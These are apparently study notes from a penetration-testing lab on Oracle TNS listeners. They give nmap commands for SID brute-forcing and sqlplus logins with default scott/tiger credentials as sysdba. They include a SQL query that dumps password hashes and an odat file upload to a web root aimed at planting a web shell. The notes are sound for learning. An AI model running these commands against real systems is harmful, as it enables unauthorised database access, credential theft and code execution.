- **tags:** #common-services #OracleTNSLister
- ---------------------
# Introduction
The *Oracle Transparent Network Substrate* (*TNS*) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. By default, the listener listens for incoming connections on the `TCP/1521` port. 
## System Identifiers (SID)
In *Oracle RDBMS*, a *System Identifier* (`SID`) is a **unique name that identifies a particular database instance**. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string.
# Footprinting
By default, the listener listens for incoming connections on the `TCP/1521` port. 
```bash
nmap -p1521 -sV 10.129.204.235 --open
```
There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like [[nmap]], [[hydra]], *odat*, and others.
```bash
# Brute-Forcing SID
nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
# Log In
We can use `sqlplus` to log in to the *Oracle DB*:
```bash
# sqlplus <username>/<password>@<targetIP>/<SID>
sqlplus scott/tiger@10.129.204.235/XE

# impersonating sysdba user
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
## Navigation
```sql
-- list all tables
select table_name from all_tables;
-- list privileges
select * from user_role_privs;
-- dump password hashes
select name, password from sys.user$;
```
# RCE
We may try to upload a web shell using *odat* in of the following default paths if the server is also running a web service:

| OS      | Path               |
| ------- | ------------------ |
| Linux   | /var/www/html      |
| Windows | C:\inetpub\wwwroot |
```bash
odat utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```